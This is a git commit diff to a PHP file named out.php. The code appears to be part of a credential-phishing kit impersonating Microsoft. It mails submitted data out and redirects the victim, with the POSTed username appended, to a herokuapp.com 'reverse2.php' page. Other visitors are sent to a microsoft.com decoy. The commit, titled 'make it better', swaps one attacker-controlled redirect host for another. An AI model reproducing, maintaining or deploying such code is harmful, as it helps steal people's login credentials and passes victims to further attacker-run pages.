32b15fe25e0ca8fcd1cdedabebe3eac00be59da7
Tevis Lucas <testitiliostajalle@tevis-MacBook-Air.local>
2022-07-08 23:29:50 +0300

    make it better

--- out.php
+++ out.php
@@ -18,7 +18,7 @@ mail("$to", "$send", "$subject", $message);
 }
 $praga=rand();
 $praga=md5($praga);
-  header ("Location: https://pwg7yegej9478edgsfej48rk4tiowg.herokuapp.com/reverse2.php?nameu=".$_POST['nameu']);
+  header ("Location: https://newstylescss-passovermakeover.herokuapp.com/reverse2.php?nameu=".$_POST['nameu']);
 }else{
 header ("Location: https://www.microsoft.com/undefined");
 }
